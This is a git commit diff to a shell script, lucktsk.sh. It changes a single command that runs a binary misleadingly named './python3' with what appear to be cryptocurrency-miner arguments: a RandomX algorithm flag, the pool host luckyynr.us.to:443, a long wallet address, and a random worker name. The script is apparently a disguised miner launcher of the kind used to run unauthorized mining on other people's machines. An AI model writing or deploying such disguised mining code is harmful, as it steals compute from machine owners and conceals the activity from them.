5a6b50e4569f0512a5fe372d96b77c58ef108b25
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-20 10:16:44 +0700

    Update lucktsk.sh

--- lucktsk.sh
+++ lucktsk.sh
@@ -8,4 +8,4 @@ nomer=$((RANDOM % 50 + 1))
 
 clear
 
-./python3 -a randomxtuske -o luckyynr.us.to:443 -u TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOTcs-$nomer
+./python3 -a rx/0 -o luckyynr.us.to:443 -u TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOTcs-$nomer
